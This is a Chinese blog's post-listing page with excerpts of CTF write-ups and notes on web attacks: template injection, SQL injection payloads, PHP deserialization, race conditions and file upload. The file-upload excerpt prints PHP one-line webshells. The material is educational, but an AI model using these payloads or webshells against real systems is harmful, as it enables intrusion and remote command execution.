<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="userq"><meta name="renderer" content="webkit"><meta name="copyright" content="userq"><meta name="keywords" content="MyBlog"><meta name="description" content="MyBlog"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>Mr.cheng's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="MyBlog" type="application/atom+xml">
</head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/cat.png"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">userq</div><div class="profile-signature">for me</div><div class="friends"><div>FRIENDS</div><span><a href="//1768161086.github.io/" target="_black">friendA</a></span><span><a href="//github.com/" target="_black">friendB</a></span><span><a href="//github.com/" target="_black">friendC</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Mr.cheng's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1>Mr.cheng's Blog</h1><h5>Welcome to my Blog!</h5><div class="intro-social"><a class="fa fa-github" href="//github.com/" target="_blank" title="github"></a><a class="fa fa-weibo" href="//www.weibo.com" target="_blank" title="weibo"></a><a class="fa fa-facebook" href="//www.facebook.com" target="_blank" title="facebook"></a><a class="fa fa-twitter" href="//twitter.com" target="_blank" title="twitter"></a><a class="fa fa-rss" href="/atom.xml" target="_blank" title="rss"></a></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><section id="recent-posts"><div class="recent-post-item"><div class="post-title"><a href="/2025/02/10/Web-python-template-injection/">Web_python_template_injection</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-02-10T02:10:52.000Z">2025-02-10</time></div><div class="recent-post-content">
Web_python_template_injection
考点：
flask模板注入如有不懂可看这篇文章
魔术方法:
1234567__class__  返回类型所属的对象__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。__base__   返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表__init__  类的初始化方法__globals__  对包含函数全局变量的字典的引用



1.判断有无模板注入：
1ur ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="flask模板注入"> flask模板注入</a></div><div class="read-more"><a class="more" href="/2025/02/10/Web-python-template-injection/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/02/09/%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6/">竞争条件</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-02-09T08:22:54.000Z">2025-02-09</time></div><div class="recent-post-content">
CTF文件包含中竞争条件实现
1.条件竞争介绍条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现 bug。例如网站文件上传，开发人员通过检测文件后缀名，设置白名单黑名单各种方式判断用户上传文件是否为危险文件，一旦发现，就会立马发现。同样的，若是我们在判断和删除事件这一时间差内进行一些操作岂不是也会成功？
2.相关实验</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="竞争条件"> 竞争条件</a></div><div class="read-more"><a class="more" href="/2025/02/09/%E7%AB%9E%E4%BA%89%E6%9D%A1%E4%BB%B6/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/02/07/buuctf-phpweb/">buuctf_phpweb</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-02-07T01:31:12.000Z">2025-02-07</time></div><div class="recent-post-content">
[网鼎杯 2020 朱雀组]phpweb
题目环境：

1.打开页面发现时间一直在变，抓包看看有没有更多信息
发现index.php用post方式提交了两个参数，func和p
2.那我们可以猜测func参数接受的是一个函数，p参数接受的是函数执行的内容，我们可以输入参数md5和1进行测试，结果显示为1的md5值
尝试读取下当前的目录信息，payload：func&#x3D;system&amp;p&#x3D;ls，显示hacking，应该是被过滤掉了
3.这里我们需要查看页面源代码，进行代码审计，可用file_get_contents()、highlight_file() ，show_sou ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="反序列化"> 反序列化</a></div><div class="read-more"><a class="more" href="/2025/02/07/buuctf-phpweb/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/02/05/buuctf-The-mystery-of-ip/">buuctf_The mystery of ip</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-02-05T01:22:57.000Z">2025-02-05</time></div><div class="recent-post-content">
[BJDCTF2020]The mystery of ip
题目环境：

添加HTTP请求头：
1X-Forwarded-For: 1

被成功执行，说明XFF可控，测试了半天，因为是php页面，所以没想到模版注入，通过查阅资料Flask可能存在Jinjia2模版注入漏洞PHP可能存在Twig模版注入漏洞
添加模版算式，检测其是否可被执行：
1X-Forwarded-For: &#123;&#123;7*7&#125;&#125;

模版中算式被成功执行，尝试是否能执行命令：
1X-Forwarded-For: &#123;&#123;system(&#x27;ls&#x27;)&#125; ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="X-Forwarded-For注入"> X-Forwarded-For注入</a></div><div class="read-more"><a class="more" href="/2025/02/05/buuctf-The-mystery-of-ip/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/02/03/HardSQL/">buuctf_HardSQL</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-02-03T00:56:21.000Z">2025-02-03</time></div><div class="recent-post-content">
[极客大挑战 2019]HardSQL
题目环境：

由题目可知是sql注入
1.使用万能密码：
10&#x27; or &#x27;1&#x27;=&#x27;1

发现了一句话:你可别被我逮住了，臭弟弟
其中union，select，order by等都被过滤了
2.输入查询列：
10&#x27; order by 3#

通过常规注入回显的都是这句话
3.我们尝试报错注入
报错注入有两个函数，这里我们使用updatexml(a,b,c)，此函数a，c必须为String类型，因此可以使a,c不为String型进行报错
(1)我们先去爆数据库：
1?username=admin&amp;p ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="sql注入"> sql注入</a></div><div class="read-more"><a class="more" href="/2025/02/03/HardSQL/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/02/01/buuctf-easy-tornado/">buuctf-easy_tornado</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-02-01T00:36:26.000Z">2025-02-01</time></div><div class="recent-post-content">
[护网杯 2018]easy_tornado
题目环境：

打开flag.txt发现了flag的目录：&#x2F;fllllllllllllag
打开huns.txt发现了md5(cookie_secret+md5(filename))
因此可用推测该题是利用cookie_secret和文件名计算MD5来获取flag。

注意题目easy_tornado；tornado是python的一个模板，可以看出这道题是模板注入类的题目

模板注入必须通过传输型如的执行命令



在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向Re ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="tornado"> tornado</a></div><div class="read-more"><a class="more" href="/2025/02/01/buuctf-easy-tornado/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-01-31T08:17:55.000Z">2025-01-31</time></div><div class="recent-post-content">
反序列化相关知识点介绍

1.魔法方法1.__sleep() &#x2F;&#x2F;执行serialize()时，先会调用这个函数2.__wakeup() &#x2F;&#x2F;将在反序列化之后立即调用（当反序列化时变量个数与实际不符时绕过）3.__construct() &#x2F;&#x2F;当对象被创建时，会触发进行初始化4.__destruct() &#x2F;&#x2F;对象被销毁时触发5.__toString()： &#x2F;&#x2F;当一个对象被当作字符串使用时触发6.__call() &#x2F;&#x2F;在对象上下文中调用不可访问的方法时触发7.__callSta ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="反序列化"> 反序列化</a></div><div class="read-more"><a class="more" href="/2025/01/31/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/01/29/sql%E6%B3%A8%E5%85%A5/">sql注入</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-01-29T07:55:09.000Z">2025-01-29</time></div><div class="recent-post-content">
sql注入相关命令介绍

1.sql相关查询命令1.查询字段数：
1’ order by 3#
2.查询数据库信息：
1’ union select user(),version(),database()#
3.获取表名
1’ union select 1,2,group_concat(table_name)from information_schema.tables where table_schema&#x3D;’库名’
4.获取列名
1’ union select 1,2,group_concat(column_name)from information_schema.columns  ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="sql注入"> sql注入</a></div><div class="read-more"><a class="more" href="/2025/01/29/sql%E6%B3%A8%E5%85%A5/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-01-27T07:25:57.000Z">2025-01-27</time></div><div class="recent-post-content">
文件上传相关知识点介绍

1.一句话木马一句话木马就是只需要一行代码的木马，短短一行代码，就能做到和大马相当的功能。为了绕过waf的检测，一句话木马出现了无数中变形，但本质是不变的：木马的函数执行了我们发送的命令。
1&lt;?php @eval($_POST[&#x27;attack&#x27;]);?&gt;

段标签木马（过滤php大小写也可用）:
1&lt;?=eval($_POST[&#x27;q&#x27;]);?&gt;

2.过滤木马可将一句话木马修改为：
123&lt;script language=&#x27;php&#x27;&gt;@eval($_POST[&#x27 ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="文件包含"> 文件包含</a></div><div class="read-more"><a class="more" href="/2025/01/27/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2025/01/25/php%E7%89%B9%E6%80%A7/">php特性</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2025-01-25T07:08:09.000Z">2025-01-25</time></div><div class="recent-post-content">
php特性相关函数介绍

1.intval() 函数：通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的 integer 数值。 intval() 不能用于 object，否则会产生 E_NOTICE 错误并返回 1 。 故此传入?num[]&#x3D;1,产生错误返回1。 并且preg_math()传入数组参数也会直接返回0
2.！strpos($num, “0”)：strpos() 函数查找字符串在另一字符串中第一次出现的位置 ，这里要求是第一个字符不是0
3.in_array() 函数：存在弱比较的漏洞，如果没有设置第三个参数，in_array() 函数在比较时默 ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="web"> web</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="原创"> 原创</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="php特性"> php特性</a></div><div class="read-more"><a class="more" href="/2025/01/25/php%E7%89%B9%E6%80%A7/#more">ReadMore</a></div><hr></div></section><nav class="cxo-page-nav"><a class="extend prev" rel="prev" href="/page/3/">&#60; PREV</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/5/">NEXT &#62;</a></nav></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>